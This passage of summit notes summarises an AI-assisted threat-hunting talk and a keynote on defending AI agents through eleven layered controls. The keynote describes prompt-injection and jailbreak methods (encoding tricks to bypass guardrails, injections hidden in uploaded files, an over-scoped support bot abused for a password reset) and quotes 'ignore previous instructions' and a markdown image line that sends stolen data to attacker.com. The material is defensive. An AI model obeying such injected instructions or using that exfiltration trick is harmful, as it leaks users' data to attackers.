> *- Firm, narrow, specific. One behavior per hypothesis."*

### The Run: One Report, Fourteen Runnable Hunts
Lauren showcased how she applied this structure to a real-world example: *The DFIR Report, May 2026 — EtherRAT -> TukTuk -> The Gentleman*. By pasting the full report link along with the one-shot prompt, the AI processed the entire intrusion chain. 

The single run successfully:
- Extracted every behavior and variant.
- Mapped them to ATT&CK (flagging 4 technique IDs for human verification).
- Scoped specific named tables and Event IDs.
- Generated **14 deep, runnable KQL hunt cards** while identifying **4 coverage gaps**.

### Hunt Card Examples
Here are three of the sharpest hunt cards generated from that single prompt *(more examples are available on her GitHub repository)*:

#### 1. Web3 C2 Resolution
- **Hypothesis:** Endpoints with no business touching Web3 are resolving C2 through blockchain and decentralized storage.
- **Data Source:** Defender DeviceNetworkEvents · DNS / Sysmon 22 · proxy SNI
- **Validation:** Dev and blockchain teams are the known false positives. Baseline expected Web3 usage first, then alert on the rest.

#### 2. Trojanized Signed Binaries
- **Hypothesis:** Legitimate signed apps are running from odd paths and making outbound connections after DLL sideloading.
- **Data Source:** DeviceImageLoadEvents + DeviceNetworkEvents · Sysmon 7
- **Validation:** Pin known-good install paths and update channels. Anything outside them on a server is worth a look.

#### 3. RMM as a C2 Channel
- **Hypothesis:** Remote management tooling is installed or running outside the approved inventory.
- **Data Source:** Security 7045 · Defender DeviceNetworkEvents (RMM SNI)
- **Validation:** Your approved RMM allowlist is the oracle. The hunt is only as good as that inventory, so build it first.

### HEARTH Runs the Loop for the Community
Lauren and the team have already built a system that automates this entire loop for the community, called **HEARTH**. Instead of threat intel dying in a Slack channel, it becomes a forkable community asset. You can try it yourself:

1. **Autosubmit a CTI link:** Paste a URL at `hearth.thorcollective.com/submit.html`. It opens a pre-filled GitHub issue.
2. **AI drafts the hunt:** The AI pipeline drafts the full hypothesis, properly PEAK-categorized.
3. **Dedup check:** The pipeline scores the new hunt against 130+ existing hunts to avoid duplication.
4. **PR to the open library:** GitHub Actions automatically opens a branch and a Pull Request for human review.

### General Takeaways
- Let automation and AI draft the hypothesis, but use human judgment to validate what is real.
- <mark>AI always hallucinates to some degree; validation is 100% part of the job.</mark>
- For a solo hunter, this process turns a report into a runnable hunt in minutes. For mature programs, it helps deduplicate the backlog and increases coverage.
- You can check out over 200 ready-to-use hunt hypotheses or submit TI reports to generate hunts automatically via the THOR Collective's Hearth project.

---

## Afternoon Keynote: "Defending AI: Organized Musings on Securing AI Agents for Cybersecurity" by Jason Haddix

### Introduction
Jason, an offensive security expert with 22 years of experience at *Arcanum*, presented a beta version of their upcoming content on defending AI. The talk was built entirely from an attacker's perspective — covering the **11 things he hates dealing with the most** when red-teaming AI applications. These 11 layers form a "Defense-in-Depth Stack" and fall into two categories:
- **Probabilistic (Speed Bumps):** Bypassable controls like guardrails and safety tuning that slow attackers down.
- **Deterministic:** Hard, technology-based controls that bound the blast radius, like web application security and access management.

> *None of these are foolproof on their own, but <mark>layered together, they create a defensible AI system</mark>.*

### Real-World AI Attacks
Jason demonstrated how attackers exploit AI systems using **Prompt Injection**. Attackers use tools like *Parseltongue* (built by jailbreak group **BT6**, led by *Pliny the Prompter*) to encode malicious prompts in hundreds of different encodings (e.g., Unicode circle letters) to bypass classifiers, guardrails, and built-in model safety tuning. He also highlighted a recent **Meta chatbot bug** where an over-scoped customer support agent allowed attackers to request a password reset code for the White House Instagram account and have it sent to an attacker-controlled email — all without ever logging in.

> *If Meta can make mistakes like these, we can all make mistakes like these when implementing agentic systems.*

### The 11 Layers of the Defense-in-Depth Stack

#### Layer 1: Web Application Security
AI systems are still web applications at the end of the day, and foundational web hygiene stops many AI-specific attacks.
- **Input Validation & Output Encoding:** Attackers need to send through JavaScript code or Markdown syntax to smuggle data out or attack other users. If the chatbot doesn't explicitly need raw special characters (brackets, exclamation points, Unicode), sanitize or disallow them. Libraries like *DOMPurify* wreck a lot of inbound attacks. Ask yourself: *Does our chatbot need to handle Unicode character sets? Alternate languages? Special characters?* If the answer is no, strip them at the web app layer.
- **Character Limits:** Analyze normal user conversation patterns and set character limits. Red teamers need a lot of prompt space to craft effective attacks, so restricting input length is a low-effort win.
- **Content Security Policy (CSP):** AI systems today are agentic, with internal logging platforms, observability dashboards, and prompt caching apps — many downloaded from GitHub and not built for security. Attackers inject JavaScript or Markdown blindly into the system, hoping it renders on an internal page when a human views the logs. <mark>A tight CSP with a domain allowlist completely blocks the common image-render exfiltration trick</mark> (`![img](attacker.com?d=base64_stolen_data)`).

#### Layer 2: Input Guardrails

> *Guardrails are essentially <mark>firewalls for LLMs</mark>.*

They inspect incoming messages for two things:
1. **Prompt Injection Primitives:** Known patterns like *"ignore previous instructions."*
2. **Verbatim Jailbreaks:** Specific known jailbreaks like "DAN" (Do Anything Now), roleplay jailbreaks, and the latest community-discovered bypasses.

Features to look for in a guardrail:
- **Self-Learning:** Advanced guardrails (like *Lakera's*, featured in their Gandalf CTF levels 8-9) automatically analyze successful attacks, learn the heuristics, and add new definitions to their database dynamically.
- **Regularly Updated Static Database:** Check if the guardrail's GitHub definition file is being updated for the newest jailbreaks (e.g., the latest poetry-based Claude bypass).
- **Non-Standard Character Alerting:** The guardrail should flag unusual character sets even if it can't determine malicious intent.
- **File Upload Parsing:** Many bypasses come through prompt injection hidden in uploaded file metadata, not just chat text. Ensure the guardrail inspects file uploads and RAG ingestion, not just the chat context.

#### Layer 3: Frontier Model Safety Tuning
Using a frontier model from a major lab (OpenAI, Anthropic, Google) provides another layer because they come pre-tuned with built-in safety training to resist simple prompt injection and harmful content generation.
- For organizations handling private data that can't use a hosted model directly, deploy a frontier model privately via **AWS Bedrock** (for Anthropic's Claude) or **Microsoft Azure** (for OpenAI's models). You own the instance, the data never leaves your organizational loop, and the <mark>privacy compliance burden shifts to AWS/Microsoft</mark>, with whom you likely already have contractual agreements for your cloud infrastructure.

#### Layer 4: LLM / Intent Routing
Before passing a request to the main model, use a small, fast, cheap LLM as a **gatekeeper** to classify whether the user's input belongs in your system at all.
- *Example:* A hospital chatbot's router is prompted with: *"Is this a medical support question? Answer with one word: support or other."* If someone asks how to cook meth, the router classifies it as "other" and drops the request before it ever reaches the main model or agents.
- This can be implemented in frameworks like **LangChain** or **Semantic Router**, and the latency is negligible since users already accept some wait time in agentic systems.
- For red teamers, this is frustrating because it can take *days if not weeks* to understand what request format will pass the router while still being malicious.

#### Layer 5: Clean RAG (Retrieval-Augmented Generation)
RAG is just hooking up a document data store to your AI app, but it introduces major risks if done carelessly.
- **Scrub PII Before Ingestion:** Don't upload documents with PII into your RAG store, then rely on a prompt to tell the AI *"never reveal social security numbers."* <mark>Prompt-based restrictions are always bypassable</mark> via prompt injection. Use tools like **Presidio** for runtime PII removal and **Tika**, **ExifTool**, or **MAT2** to strip metadata.
- **Watch for Metadata Leaks:** Even if document text is scrubbed, metadata (author, timestamps, internal paths) can leak sensitive information.
- **Scan for Embedded Prompt Injection:** Now that AI is mainstream, attackers embed prompt injections in documents (like resumes) that get ingested into your data store. Scan incoming documents, even from "trusted" third-party partners.
- **Vector-Level Authorization:** Modern RAG databases now support per-user or per-document authorization at the vector level. Use these features to restrict which users can access which chunks.

#### Layer 6: Agent IAM (Identity & Access Management)
Backend agents are what make AI apps powerful, but they need to be treated like employees with <mark>least-privilege access</mark>.
- **Deny by Default:** Most LLMs used as agents come with all tools enabled (code execution, web search, API read/write). Start by denying everything and only enable what the specific agent needs.
- **Don't Control Access via Prompting:** You cannot instruct an agent via its prompt to *"never delete users."* That is always bypassable. Remove the capability at the **configuration level**, not the prompt level.
- **Separate Dangerous Actions:** If an agent needs to read documents, it should only have `readDoc` and `search` permissions. Destructive actions like `deleteUser` or `executeCode` should be separated into a different, sandboxed agent or handled through a deterministic non-AI workflow entirely (like calling customer service or a web app flow).

#### Layer 7: Read-Only + Egress Control
When agents interact with third-party APIs or internal data stores, enforce **read-only access by default** and lock down where data can go.
- Ensure agents cannot write to or modify external systems unless explicitly required and sandboxed.
- Implement egress controls that whitelist only the specific domains and IPs the agent is allowed to communicate with. If an attacker tricks an agent into exfiltrating data to `attacker.com`, egress controls stop the request.
- Tie agent network communication to the source IP or session of the originating user, so agents can <mark>never initiate outbound connections to addresses not associated with the legitimate user session</mark>.

#### Layer 8: Output Classifier
While input guardrails filter what goes *in*, an output classifier filters what comes ***out*** of the model.
- It checks the model's responses before they reach the user for leaked system prompts, PII, sensitive data, or harmful content that slipped past the input controls.
- This catches scenarios where a prompt injection bypassed input guardrails but the resulting output still contains data that should never leave the system.
- Like input guardrails, these can be LLM-based or regex-based, and are another probabilistic speed bump in the stack.

#### Layer 9: Token Limits
Restricting the number of tokens (input and output) that a model can process in a single interaction is a simple but effective control.
- Large, complex prompt injections and jailbreaks require significant token budgets to craft properly. <mark>Limiting token counts restricts the attacker's workspace.</mark>
- On the output side, token limits prevent the model from dumping large volumes of sensitive data in a single response, even if a prompt injection is partially successful.

#### Layer 10: Rate Limiting & Cost Caps
This is a deterministic control that limits how many requests a user or session can make over a given time period.
- Attackers need to send hundreds (sometimes thousands) of requests to probe, enumerate, and brute-force a working prompt injection or jailbreak. Rate limiting forces them to slow down dramatically and increases the chance of detection.
- **Cost Caps** set hard spending limits per user or session. This prevents abuse-of-service attacks where an attacker floods the system with expensive inference calls to rack up costs (a <mark>denial-of-wallet</mark> attack).
- While not foolproof, when layered with everything else, it makes the attacker's job significantly harder and slower.

#### Layer 11: Inference Logging + Threat Hunting
The final layer is about **visibility**. If all other layers fail, you need to be able to detect and investigate what happened.
- **Log Every Inference:** Capture every input, output, token usage, and tool call made by the system. This includes the full conversation context, not just the user-facing chat.
- **Threat Hunt AI Logs:** Apply the same threat hunting principles discussed earlier in this summit to your AI inference logs. Look for anomalous patterns: unusual character sets, repeated encoding attempts, session spikes from a single IP, or agents making unexpected outbound calls.
- **Alerting on Anomalies:** Build detection rules for known prompt injection patterns, unusual token consumption, or agents accessing data they shouldn't.

> *This layer ensures that even if an attacker breaches every other control, their activity is <mark>recorded and can be investigated forensically</mark>.*

---

## References & Further Reading

Here is a compiled list of all the frameworks, tools, projects, and resources mentioned throughout the summit:

### Frameworks & Methodologies
- **PEAK Threat Hunting Framework** — Splunk's modern framework for threat hunting (Prepare, Execute, Act with Knowledge). [splunk.com/en_us/blog/security/peak-threat-hunting-framework.html](https://www.splunk.com/en_us/blog/security/peak-threat-hunting-framework.html)
- **ATHF (Agentic Threat Hunting Framework) & LOCK Format** — Sydney Marrone's methodology for structuring threat hunt memory and notes.
- **Sqrrl Threat Hunting Loop** — One of the earliest foundational frameworks for hypothesis-driven threat hunting.
- **MITRE ATT&CK** — The globally accessible knowledge base of adversary tactics and techniques. [attack.mitre.org](https://attack.mitre.org/)
- **Threat Hunting Maturity Model** — David Bianco's five-tier model for assessing organizational threat hunting capability.
- **Pyramid of Pain** — David Bianco's framework for understanding the value of different indicator types. [detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html](http://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html)

### Projects & Repositories
- **THOR Collective (HEARTH)** — An open library of 200+ threat hunting hypotheses. Submit and view hunts at [hearth.thorcollective.com](https://hearth.thorcollective.com). [github.com/ThreatHuntingProject](https://github.com/ThreatHuntingProject)
- **The DFIR Report** — Detailed, actionable threat intelligence reports used to test hypothesis generation. [thedfirreport.com](https://thedfirreport.com/)
- **Threat Hunting Toolkit** — Developed by *Ethan Robish* (BHIS), useful for standardizing interactions with Zeek logs. [github.com/activecm/threat-hunting-toolkit](https://github.com/activecm/threat-hunting-toolkit)
- **PEAK Assistant** — David Bianco's open-source AI assistant targeting the Prepare phase of threat hunting. [github.com/davidjbianco/peak-assistant](https://github.com/davidjbianco/peak-assistant)
- **Parseltongue** — Encoding toolset used by AI red teamers (BT6 jailbreak group) for prompt injection testing. [github.com/Pliny-the-Prompter/parseltongue](https://github.com/Pliny-the-Prompter/parseltongue)
- **Gandalf CTF by Lakera** — Prompt injection CTF with progressive difficulty levels. [gandalf.lakera.ai](https://gandalf.lakera.ai/)

### Tools & Technologies
- **RITA (Real Intelligence Threat Analytics)** — Open-source network traffic analysis framework for detecting C2 communication, by Active Countermeasures. [github.com/activecm/rita](https://github.com/activecm/rita)
- **Active Countermeasures** — Creators of RITA and experts in network threat hunting. [activecountermeasures.com](https://www.activecountermeasures.com/)
- **Zeek** — Open-source network security monitoring tool. [zeek.org](https://zeek.org/)
- **Zui (formerly Brim)** — A desktop application for analyzing packet captures and converting them to Zeek logs via Zed Lake. [zui.brimdata.io](https://zui.brimdata.io/)
- **DuckDB** — Fast in-process analytical database used for data processing in AI agent context engineering. [duckdb.org](https://duckdb.org/)
- **Sigma** — Generic and open signature format for SIEM systems. [github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)
- **DOMPurify** — XSS sanitizer library for HTML, MathML, and SVG, recommended for AI web app security. [github.com/cure53/DOMPurify](https://github.com/cure53/DOMPurify)
- **Presidio** — Microsoft's open-source PII detection and anonymization SDK. [github.com/microsoft/presidio](https://github.com/microsoft/presidio)
- **LangChain** — Framework for developing applications powered by LLMs, including intent routing. [langchain.com](https://www.langchain.com/)
- **Semantic Router** — Fast decision-making layer for LLMs used for intent routing. [github.com/aurelio-labs/semantic-router](https://github.com/aurelio-labs/semantic-router)

### Platforms & Services
- **AWS Bedrock** — Amazon's managed service for deploying frontier models privately. [aws.amazon.com/bedrock](https://aws.amazon.com/bedrock/)
- **Microsoft Azure OpenAI Service** — Microsoft's enterprise deployment of OpenAI models. [azure.microsoft.com/en-us/products/ai-services/openai-service](https://azure.microsoft.com/en-us/products/ai-services/openai-service)
- **Lakera** — AI security platform providing self-learning guardrails and classifiers. [lakera.ai](https://www.lakera.ai/)
- **Antisyphon Training** — The organization hosting the Thrunting Summit. [antisyphontraining.com](https://www.antisyphontraining.com/)
- **Arcanum Information Security** — Jason Haddix's firm specializing in AI red teaming. [arcanuminfosec.com](https://www.arcanuminfosec.com/)
